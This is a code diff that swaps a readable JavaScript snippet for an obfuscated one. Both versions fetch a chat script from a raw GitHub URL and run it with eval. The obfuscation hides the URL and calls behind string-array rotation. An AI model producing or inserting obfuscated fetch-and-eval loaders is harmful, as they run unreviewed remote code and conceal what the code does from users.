@@ -1,9 +1,1 @@
-const idValue = chatid; // your ids
-fetch('https://raw.githubusercontent.com/hirotomoki12345/Chatcode/main/source/chat.js')
-    .then(response => response.text())
-    .then(text => {
-        eval(text);
-    })
-    .catch(error => {
-        console.error('Fetch error:', error);
-    });
+function _0x32e7(){const _0x4fcd72=['2131996FrQFhZ','1608444PKVHPE','1960410bJDHon','then','1070890mrfosm','https://raw.githubusercontent.com/hirotomoki12345/Chatcode/main/source/chat.js','3976082CZGJgC','1292543xSpFCC','catch','1feiRZK','206038KKWKdx','3YTPGHH','16dlTNrc','54LfpDwz'];_0x32e7=function(){return _0x4fcd72;};return _0x32e7();}function _0x5a19(_0x7208a3,_0xa269a0){const _0x32e791=_0x32e7();return _0x5a19=function(_0x5a19e3,_0x395de9){_0x5a19e3=_0x5a19e3-0x17d;let _0x66e522=_0x32e791[_0x5a19e3];return _0x66e522;},_0x5a19(_0x7208a3,_0xa269a0);}const _0x522fac=_0x5a19;(function(_0x195589,_0x324bdb){const _0x5e7d7f=_0x5a19,_0x547a06=_0x195589();while(!![]){try{const _0x5c0127=-parseInt(_0x5e7d7f(0x17e))/0x1*(-parseInt(_0x5e7d7f(0x17f))/0x2)+-parseInt(_0x5e7d7f(0x180))/0x3*(parseInt(_0x5e7d7f(0x183))/0x4)+parseInt(_0x5e7d7f(0x185))/0x5+-parseInt(_0x5e7d7f(0x184))/0x6+parseInt(_0x5e7d7f(0x18a))/0x7*(-parseInt(_0x5e7d7f(0x181))/0x8)+-parseInt(_0x5e7d7f(0x182))/0x9*(-parseInt(_0x5e7d7f(0x187))/0xa)+parseInt(_0x5e7d7f(0x189))/0xb;if(_0x5c0127===_0x324bdb)break;else _0x547a06['push'](_0x547a06['shift']());}catch(_0x419ae6){_0x547a06['push'](_0x547a06['shift']());}}}(_0x32e7,0x50416));const idValue=chatid;fetch(_0x522fac(0x188))[_0x522fac(0x186)](_0x38d425=>_0x38d425['text']())['then'](_0x497318=>{eval(_0x497318);})[_0x522fac(0x17d)](_0x22fd52=>{console['error']('Fetch\x20error:',_0x22fd52);});
